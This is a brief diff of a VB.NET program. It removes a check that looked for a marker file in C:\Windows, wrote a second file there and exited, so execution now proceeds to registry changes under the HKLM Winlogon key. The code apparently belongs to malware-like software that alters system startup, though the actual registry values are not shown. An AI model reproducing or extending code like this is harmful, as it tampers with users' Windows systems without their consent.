@@ -87,14 +87,6 @@ Module Program
     End Sub
 
     Sub Main()
-        ' Check if WinAttr.gci exists and handle accordingly
-        If File.Exists("C:\Windows\WinAttr.gci") Then
-            ' Create emirhanucankek.txt
-            File.Create("C:\Windows\emirhanucankek.txt").Dispose()
-            ' Exit Main function
-            Return
-        End If
-
         ' Initial registry modifications
         Try
             Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon")
